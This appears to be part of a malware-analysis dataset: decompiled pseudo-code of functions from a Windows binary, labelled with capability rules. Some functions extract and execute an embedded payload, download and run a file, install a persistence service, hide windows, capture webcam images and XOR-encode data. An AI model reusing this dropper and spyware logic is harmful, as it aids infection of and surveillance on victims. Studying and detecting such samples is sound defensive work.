        "decompiled_code": "\nuint fcn.0047e780(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    bool bVar3;\n    \n    iVar1 = sub.user32.dll_GetSystemMetrics(0);\n    iVar2 = sub.user32.dll_GetSystemMetrics(1);\n    (**(**0x498958 + 0x40))();\n    (**(**0x498958 + 0x34))();\n    if (((iVar1 == *0x498964) && (bVar3 = iVar2 == *0x498968,  bVar3)) && (fcn.00405894(),  bVar3)) {\n        return 0;\n    }\n    *0x498964 = iVar1;\n    *0x498968 = iVar2;\n    (**(**0x498958 + 0x40))();\n    (**(**0x498958 + 0x34))();\n    (**(**0x49895c + 0x40))();\n    (**(**0x49895c + 0x34))();\n    fcn.0042a0dc();\n    fcn.0042a0dc();\n    fcn.0042a0dc();\n    *0x498974 = 0;\n    return 1;\n}\n",
        "token_count": 266
    },
    "0048b4c0": {
        "rules": [
            "create or open file",
            "create process on Windows",
            "write file on Windows",
            "extract resource via kernel32 functions",
            "write and execute a file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048b4c0(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_14h = 0;\n    uStack48 = 0x48b5b4;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    var_4h = 0xffffffff;\n    uVar1 = func_0x00407abc(0, arg_10h, arg_ch);\n    fcn.00488b14(0x40000000, 2, 0, 2, 0x80, 0);\n    fcn.00405664(&var_ch);\n    fcn.00405738();\n    uVar2 = fcn.004058fc();\n    uVar2 = func_0x004079fc(uVar2);\n    uVar3 = sub.kernel32.dll_SizeofResource(0, uVar1, &var_8h, 0);\n    uVar1 = sub.kernel32.dll_LoadResource(0, uVar1, uVar3);\n    uVar1 = sub.kernel32.dll_LockResource(uVar1);\n    sub.kernel32.dll_WriteFile_1(uVar2, uVar1);\n    sub.kernel32.dll_CloseHandle_1(uVar2);\n    fcn.00488b14(0, 0, 5);\n    fcn.00405664(&var_14h);\n    fcn.00405738();\n    uVar1 = fcn.004058fc();\n    uVar2 = 0;\n    func_0x0040feb8(0, 0x48b5c8, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405490(0x48b5bb);\n    return;\n}\n",
        "token_count": 515
    },
    "0048bcac": {
        "rules": [
            "create or open file",
            "create thread",
            "write file on Windows",
            "extract resource via kernel32 functions"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048bcac(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_8h = 0;\n    var_ch = 0;\n    uStack56 = 0x48bdc4;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    var_4h = 0xffffffff;\n    uVar1 = func_0x00407abc(0, arg_10h, arg_ch);\n    fcn.00488b14(0x40000000, 2, 0, 2, 0x80, 0);\n    fcn.00405664(0);\n    fcn.00405800(0x48bde0, 0);\n    uVar2 = fcn.004058fc();\n    uVar2 = func_0x004079fc(uVar2);\n    uVar3 = sub.kernel32.dll_SizeofResource(0, uVar1, &var_8h, 0);\n    uVar1 = sub.kernel32.dll_LoadResource(0, uVar1, uVar3);\n    uVar1 = sub.kernel32.dll_LockResource(uVar1);\n    sub.kernel32.dll_WriteFile_1(uVar2, uVar1);\n    sub.kernel32.dll_CloseHandle_1(uVar2);\n    uVar1 = sub.kernel32.dll_LocalAlloc_1(0x40, 4);\n    fcn.00488b14();\n    fcn.00405664(0);\n    fcn.00405800(0x48bde0, 0);\n    uVar1 = sub.kernel32.dll_CreateThread(0, 0, fcn.0048bbfc, uVar1, 0, &var_ch);\n    sub.kernel32.dll_CloseHandle_1();\n    *in_FS_OFFSET = uVar1;\n    fcn.00405490(0x48bdcb);\n    return;\n}\n",
        "token_count": 537
    },
    "00430348": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00430348(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x430372;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    (**(*in_EAX + 0x30))();\n    *in_FS_OFFSET = uStack32;\n    return;\n}\n",
        "token_count": 124
    },
    "00447c3c": {
        "rules": [
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.00447c3c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x447cce;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    uVar3 = *(in_EAX + 0x34);\n    uVar2 = sub.comctl32.dll_ImageList_Create\n                      (uVar3, *(in_EAX + 0x30), *(*(in_EAX + 0x41) * 4 + 0x491628) | 0xfe, *(in_EAX + 0x38), \n                       *(in_EAX + 0x38));\n    *(in_EAX + 0x3c) = uVar2;\n    cVar1 = fcn.00447a64();\n    if (cVar1 == '\\0') {\n        fcn.004075f4();\n        fcn.0040da70();\n        fcn.00404eb4();\n    }\n    if (*(in_EAX + 0x44) != 0x1fffffff) {\n        fcn.00447e64();\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.0040546c(0x447cd5);\n    return;\n}\n",
        "token_count": 339
    },
    "00411bf4": {
        "rules": [
            "inject pe/d5f0df8b10fc4abbbb9974951b6b6eb4"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411bf4(uint16_t param_1, uint16_t *param_2)\n\n{\n    if ((*param_2 & 0xfff) < 0x14) {\n        if ((param_1 & 0xfff) < 0x14) {\n            (***0x4929e8)();\n            fcn.00411244();\n        }\n        else {\n            fcn.00410e04();\n        }\n    }\n    else {\n        fcn.00411ce0();\n        (***0x4929e8)();\n        fcn.00411244();\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "00449e20": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449e20(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar in_ZF;\n    \n    fcn.00405894(param_2);\n    if (!in_ZF) {\n        iVar2 = *(in_EAX[0x14] + 8);\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.004047f0();\n                if (piVar1 != NULL) {\n                    (**(*piVar1 + 0x68))();\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        fcn.004054c0();\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "00452420": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452420(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x4524bd;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.004047cc();\n    if (cVar1 == '\\0') {\n        fcn.00419e64();\n    }\n    else {\n        (**(*in_EAX + 0x50))();\n        fcn.00449ce4();\n        fcn.00449e20();\n        fcn.0044fcc4();\n        fcn.00449b7c();\n        fcn.00449f40();\n        (**(*param_2 + 0x34))(in_EAX[0x44], in_EAX[0x45]);\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x4524c4;\n    uStack28 = 0x4524bc;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 293
    },
    "0042321c": {
        "rules": [
            "encode data using XOR",
            "encode data using XOR"
        ],
        "decompiled_code": "\nuint16_t __fastcall fcn.0042321c(uint param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    uint8_t *in_EAX;\n    \n    uVar1 = 0;\n    do {\n        uVar1 = uVar1 << 5 & 0xff00 | (uVar1 << 5 | uVar1 >> 0xb) ^ *in_EAX;\n        in_EAX = in_EAX + 1;\n        param_2 = param_2 + -1;\n    } while (param_2 != 0);\n    return uVar1;\n}\n",
        "token_count": 136
    },
    "0045f9f0": {
        "rules": [
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f9f0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if (param_2 != 0) {\n        do {\n            *(param_2 + -1 + in_EAX) = *(param_2 + -1 + in_EAX) ^ *(param_2 + 0x4918ab);\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "00446860": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nvoid fcn.00446860(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x84) != 0) {\n        cVar1 = fcn.00457d34();\n        if (cVar1 != '\\0') {\n            uVar2 = fcn.00457a28();\n            iVar3 = sub.user32.dll_IsWindowVisible(uVar2);\n            if (iVar3 != 0) {\n                cVar1 = (**(**(in_EAX + 0x84) + 0xf0))();\n                if (cVar1 == '\\0') {\n                    fcn.0044669c();\n                }\n                else {\n                    uVar2 = fcn.00457a28(0);\n                    sub.user32.dll_ShowWindow(uVar2);\n                    fcn.0044fbe4();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 214
    },
    "00464174": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.00464174(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x4641a8, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x4641b8, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x4641c8, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 121
    },
    "0046423c": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046423c(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x464260, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x464270, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 87
    },
    "004641d8": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.004641d8(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46420c, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46421c, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46422c, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 119
    },
    "004642c4": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.004642c4(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x4642e8, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x4642f8, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 91
    },
    "0046434c": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nvoid fcn.0046434c(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowExA(0, 0, 0x464368, 0);\n    sub.user32.dll_ShowWindow(uVar1, 0);\n    return;\n}\n",
        "token_count": 65
    },
    "00464308": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.00464308(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x46432c, 0);\n    uVar1 = sub.user32.dll_FindWindowExA(uVar1, 0, 0x46433c, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 88
    },
    "00464370": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.00464370(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowExA(0, 0, 0x46438c, 0);\n    sub.user32.dll_ShowWindow(uVar1, 5);\n    return;\n}\n",
        "token_count": 65
    },
    "00468140": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.00468140(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x468158, 0, 5);\n    sub.user32.dll_ShowWindow(uVar1);\n    return;\n}\n",
        "token_count": 57
    },
    "00468168": {
        "rules": [
            "hide graphical window",
            "find graphical window"
        ],
        "decompiled_code": "\nvoid fcn.00468168(void)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_FindWindowA(0x468180, 0, 0);\n    sub.user32.dll_ShowWindow(uVar1);\n    return;\n}\n",
        "token_count": 57
    },
    "00463cc4": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00463cc4(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint var_4h;\n    \n    puStack12 = 0x463cd3;\n    fcn.004058ec();\n    uStack16 = 0x463d07;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    puStack12 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc(0);\n    sub.kernel32.dll_WinExec();\n    *in_FS_OFFSET = uVar1;\n    uStack20 = 0x463d0e;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 176
    },
    "00472788": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl\nfcn.00472788\n noreturn \n          (uint arg_8h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar uVar4;\n    uint var_30h;\n    uint var_2ch;\n    uchar *var_28h;\n    uint uStack40;\n    uint var_20h;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_28h = &stack0xfffffffc;\n    iVar3 = 6;\n    do {\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    puStack32 = 0x4727ac;\n    fcn.00405f08();\n    var_20h = 0x4728f4;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    var_2ch = 0x472895;\n    var_30h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00472788::var_30h;\n    puStack32 = &stack0xfffffffc;\n    fcn.0040858c();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    uVar1 = fcn.004058fc(0, 0);\n    uVar2 = fcn.004058fc(uVar1);\n    iVar3 = sub.URLMON.DLL_URLDownloadToFileA(0, uVar2);\n    uVar4 = iVar3 == 0;\n    if (uVar4) {\n        fcn.00405784();\n        fcn.00472b58();\n    }\n    else {\n        fcn.00405784();\n        fcn.00472b58();\n    }\n    fcn.00409af4();\n    fcn.00405894();\n    if (uVar4) {\n        sub.shell32.dll_ShellExecuteA(0, 0x472944, uVar1, 0, 0, 5);\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitThread(0);\n}\n",
        "token_count": 526
    },
    "00488b54": {
        "rules": [
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00488b54(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    uint var_4h;\n    \n    puStack12 = 0x488b63;\n    fcn.004058ec();\n    uStack16 = 0x488b97;\n    uStack20 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffec;\n    puStack12 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc(0);\n    sub.kernel32.dll_WinExec();\n    *in_FS_OFFSET = uVar1;\n    uStack20 = 0x488b9e;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 176
    },
    "00468398": {
        "rules": [
            "capture webcam image/8f9bddbfc62a47b78ef3c85708336261"
        ],
        "decompiled_code": "\nvoid fcn.00468398(void)\n\n{\n    sub.user32.dll_SendMessageA(*0x498798, 0x40b, 0, 0);\n    sub.user32.dll_SendMessageA(*0x498798, 0x10, *0x4987a4, 0);\n    *0x498798 = 0;\n    return;\n}\n",
        "token_count": 81
    },
    "004719ec": {
        "rules": [
            "persist via Windows service/917cb411848e45f2aea8f119d5b1b71c",
            "persist via Windows service/917cb411848e45f2aea8f119d5b1b71c"
        ],
        "decompiled_code": "\nvoid fcn.004719ec(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    uint arg_8h;\n    int32_t iStack132;\n    int32_t iStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    int32_t iStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = 0x471a10;\n    fcn.004058ec();\n    uStack52 = 0x471b12;\n    iStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    uStack60 = 0xf003f;\n    uStack64 = 0;\n    uStack68 = 0;\n    puStack72 = 0x471a31;\n    puStack48 = &stack0xfffffffc;\n    iVar1 = sub.advapi32.dll_OpenSCManagerA();\n    if (iVar1 != 0) {\n        uStack76 = 0x471ad7;\n        iStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack72 = &stack0xfffffffc;\n        fcn.004058fc(0, 0, 0, 0, 0);\n        uVar2 = sub.advapi32.dll_CreateServiceA();\n        fcn.00405664();\n        arg_8h = 0;\n        fcn.00405664();\n        fcn.00405784();\n        fcn.004058fc();\n        fcn.00405664();\n        fcn.00471384(arg_8h);\n        sub.advapi32.dll_CloseServiceHandle(uVar2);\n        sub.advapi32.dll_CloseServiceHandle();\n        *in_FS_OFFSET = iVar1;\n        iStack132 = iVar1;\n    }\n    *in_FS_OFFSET = iStack132;\n    fcn.00405490(0x471b19);\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 507
    },
    "004040f0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004040f0(uint32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *in_EAX;\n    char *pcVar2;\n    \n    pcVar2 = in_EAX;\n    if (0xff < param_1) {\n        param_1 = 0xff;\n    }\n    do {\n        cVar1 = *param_2;\n        param_2 = param_2 + 1;\n        if (cVar1 == '\\0') break;\n        pcVar2 = pcVar2 + 1;\n        *pcVar2 = cVar1;\n        param_1 = param_1 - 1;\n    } while (param_1 != 0);\n    *in_EAX = pcVar2 - in_EAX;\n    return;\n}\n",
        "token_count": 177
    },
    "004046a4": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004046a4(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    \n    do {\n        iVar1 = *in_EAX;\n        in_EAX = *(iVar1 + -0x24);\n        if (*(iVar1 + -0x40) != 0) {\n            fcn.00405fcc();\n        }\n    } while (in_EAX != NULL);\n    return;\n}\n",
        "token_count": 95
    },
    "004047f0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.004047f0(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX != NULL) {\n        while (*in_EAX != param_2) {\n            in_EAX = *(*in_EAX + -0x24);\n            if (in_EAX == NULL) {\n                if (*0x493008 != NULL) {\n                    (**0x493008)();\n                }\n                fcn.00402fe8();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 138
    },
    "0040486c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0040486c(uint param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        if (in_EAX == param_2) {\n            return 0x1;\n        }\n        piVar1 = *(in_EAX + -0x24);\n        if (piVar1 == NULL) break;\n        in_EAX = *piVar1;\n    }\n    return piVar1;\n}\n",
        "token_count": 117
    },
    "00405100": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405100(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    iVar3 = *0x4957d4;\n    puStack20 = &stack0xfffffffc;\n    if (*0x4957d0 != 0) {\n        iVar1 = *(*0x4957d0 + 4);\n        uStack24 = 0x405149;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        if (0 < iVar3) {\n            do {\n                iVar3 = iVar3 + -1;\n                pcVar2 = *(iVar1 + 4 + iVar3 * 8);\n                *0x4957d4 = iVar3;\n                if (pcVar2 != NULL) {\n                    (*pcVar2)();\n                }\n            } while (0 < iVar3);\n        }\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 240
    },
    "00405164": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00405164(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*0x4957d0 != NULL) {\n        iVar1 = **0x4957d0;\n        iVar4 = 0;\n        iVar2 = (*0x4957d0)[1];\n        uStack28 = 0x4051b1;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        if (0 < iVar1) {\n            do {\n                pcVar3 = *(iVar2 + iVar4 * 8);\n                iVar4 = iVar4 + 1;\n                *0x4957d4 = iVar4;\n                if (pcVar3 != NULL) {\n                    (*pcVar3)();\n                }\n            } while (iVar4 < iVar1);\n        }\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 259
    },
    "00405bf8": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00405bf8(uint param_1, uchar *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uchar *puVar5;\n    \n    iVar3 = 0;\n    if (param_2 != NULL) {\n        iVar3 = *(param_2 + -4);\n    }\n    iVar2 = fcn.00404020();\n    if ((*(iVar2 + 4) == -0x284e) || (cVar1 = fcn.00403f88(iVar3, param_2),  cVar1 != '\\0')) {\n        while( true ) {\n            puVar5 = *(iVar2 + 0x14) + *(iVar2 + 0xc);\n            iVar4 = *(iVar2 + 8) - *(iVar2 + 0xc);\n            if (iVar3 < iVar4) break;\n            *(iVar2 + 0xc) = *(iVar2 + 0xc) + iVar4;\n            iVar3 = iVar3 - iVar4;\n            for (; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar5 = *param_2;\n                param_2 = param_2 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            iVar4 = (**(iVar2 + 0x1c))();\n            if (iVar4 != 0) {\n                fcn.0040306c();\n                return iVar2;\n            }\n        }\n        *(iVar2 + 0xc) = *(iVar2 + 0xc) + iVar3;\n        for (; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar5 = *param_2;\n            param_2 = param_2 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 427
    },
    "00406104": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n// WARNING: Removing unreachable block (ram,0x00406086)\n// WARNING: Removing unreachable block (ram,0x0040606c)\n\nvoid __fastcall fcn.00406104(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = 1;\n    cVar1 = *param_2;\n    if (cVar1 == '\\n') {\n        fcn.0040546c();\n    }\n    else if (cVar1 == '\\v') {\n        fcn.00405c48();\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.00406000();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.00406018();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\x0e') {\n        do {\n            fcn.00405fcc();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.004070f8();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x493008 != NULL) {\n                (**0x493008)();\n            }\n            fcn.00402fe8();\n            return;\n        }\n        do {\n            fcn.00406a20();\n            iVar4 = iVar3 + -1;\n            bVar2 = 0 < iVar3;\n            iVar3 = iVar4;\n        } while (iVar4 != 0 && bVar2);\n    }\n    return;\n}\n",
        "token_count": 539
    },
    "00406878": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00406878(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    int32_t iVar3;\n    \n    if (param_1 != 0) {\n        cVar1 = *param_2;\n        if (cVar1 == '\\n') {\n            if (param_1 < 2) {\n                fcn.0040546c();\n            }\n            else {\n                fcn.00405490();\n            }\n        }\n        else if (cVar1 == '\\v') {\n            if (param_1 < 2) {\n                fcn.00405c48();\n            }\n            else {\n                fcn.00405c60();\n            }\n        }\n        else if (cVar1 == '\\f') {\n            do {\n                fcn.00406000();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\r') {\n            do {\n                fcn.00406018();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0e') {\n            do {\n                fcn.00405fcc();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else if (cVar1 == '\\x0f') {\n            do {\n                fcn.004070f8();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x493008 != NULL) {\n                    (**0x493008)();\n                }\n                fcn.00402fe8();\n                return;\n            }\n            do {\n                fcn.00406a20();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 577
    },
    "00406afc": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00406afc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    piVar2 = *0x490038;\n    if (*0x490038 != NULL) {\n        do {\n            if (((in_EAX == piVar2[1]) || (in_EAX == piVar2[2])) || (in_EAX == piVar2[3])) {\n                iVar1 = fcn.00406ab4();\n                return iVar1;\n            }\n            piVar2 = *piVar2;\n        } while (piVar2 != NULL);\n    }\n    return in_EAX;\n}\n",
        "token_count": 149
    },
    "00406b34": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nchar * fcn.00406b34(void)\n\n{\n    char *in_EAX;\n    \n    while ((*in_EAX != '\\0' && (*in_EAX != '\\\\'))) {\n        in_EAX = sub.user32.dll_CharNextA();\n    }\n    return in_EAX;\n}\n",
        "token_count": 62
    },
    "00406fb8": {
        "rules": [
            "contain loop"
        ],
